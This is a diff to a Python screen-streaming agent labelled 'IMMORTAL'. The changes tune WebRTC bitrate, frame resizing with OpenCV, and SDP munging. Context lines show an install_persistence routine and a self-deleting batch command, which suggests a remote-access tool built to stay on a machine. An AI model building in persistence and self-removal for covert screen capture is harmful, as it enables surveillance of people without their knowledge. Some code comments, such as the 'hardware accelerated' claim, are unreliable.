@@ -23,7 +23,7 @@ import numpy
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.1.6-IMMORTAL"
+AGENT_VERSION = "9.1.8-IMMORTAL"
 
 def install_persistence():
     current_exe = sys.executable
@@ -119,9 +119,9 @@ del "%~f0"
 selected_monitor = 1  
 display_mode = "monitor"
 target_fps = 20
-current_quality = 50
+current_quality = 40
 audio_enabled = False
-BITRATE = 1500000
+BITRATE = 2500000
 relay = MediaRelay()
 
 # --- Controllers ---
@@ -246,20 +246,23 @@ class ScreenVideoTrack(VideoStreamTrack):
             else:
                 mon = self.sct.monitors[mon_idx]
                 sct_img = self.sct.grab(mon)
-                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-            
-            frame = av.VideoFrame.from_image(img)
-            
-            w, h = img.width, img.height
-            limit = 1280 if (mon_idx == 0 or current_quality >= 60) else 960
-            
-            if w > limit:
+                
+                # Bypass PIL: Parse Raw Bytes into OpenCV numpy array
+                bgra = numpy.frombuffer(sct_img.bgra, dtype=numpy.uint8).reshape(mon["height"], mon["width"], 4)
+                
+                # Mandatory 720p scaling for AnyDesk-like fluidity
+                w, h = mon["width"], mon["height"]
+                limit = 1280
+                
                 new_h = int(h * (limit / w))
-                new_h = new_h - (new_h % 2) # Force even for YUV420P
-                frame = frame.reformat(width=limit, height=new_h, format='yuv420p')
-            else:
-                w, h = w - (w % 2), h - (h % 2)
-                frame = frame.reformat(width=w, height=h, format='yuv420p')
+                new_h -= new_h % 2
+                
+                # Hardware Accelerated Resizing
+                bgra = cv2.resize(bgra, (limit, new_h), interpolation=cv2.INTER_LINEAR)
+                rgb = cv2.cvtColor(bgra, cv2.COLOR_BGRA2RGB)
+                
+                frame = av.VideoFrame.from_ndarray(rgb, format='rgb24')
+                frame = frame.reformat(format='yuv420p')
         except Exception as e:
             import traceback
             traceback.print_exc()
@@ -417,16 +420,23 @@ async def start_session(ws, sct):
                     ans = await pc.createAnswer()
                     await pc.setLocalDescription(ans)
                     
-                    # BLOCKING ICE GATHERING LOOP (CRITICAL FIX FOR P2P TOPOLOGY)
-                    # We mathematically pause the ws.send hook for a maximum of 2.5 seconds to explicitly guarantee 
-                    # aiortc completes its STUN lookup against Google. Failing to wait outputs an empty Answer string,
-                    # rendering JavaScript completely blind and fatally resulting in ICE disconnected/failed.
+                    # ANYDESK SDP HACK: Inject High Bitrate Negotiation Commands
+                    sdp_lines = pc.localDescription.sdp.split("\n")
+                    fixed_sdp = []
+                    for line in sdp_lines:
+                        fixed_sdp.append(line)
+                        if "a=mid:" in line:
+                            fixed_sdp.append("a=fmtp:42 x-google-max-bitrate=3500;x-google-min-bitrate=500;x-google-start-bitrate=1500")
+                            fixed_sdp.append("a=fmtp:98 x-google-max-bitrate=3500;x-google-min-bitrate=500;x-google-start-bitrate=1500")
+
+                    final_sdp = "\n".join(fixed_sdp)
+                    
                     gather_timeout = 0
                     while pc.iceGatheringState != "complete" and gather_timeout < 25:
                         await asyncio.sleep(0.1)
                         gather_timeout += 1
                         
-                    await ws.send(orjson.dumps({"t": "rtc_answer", "sdp": pc.localDescription.sdp, "type": pc.localDescription.type}).decode())
+                    await ws.send(orjson.dumps({"t": "rtc_answer", "sdp": final_sdp, "type": pc.localDescription.type}).decode())
                 elif event.get("t") == "rtc_ice":
                     try:
                         from aiortc.sdp import candidate_from_sdp
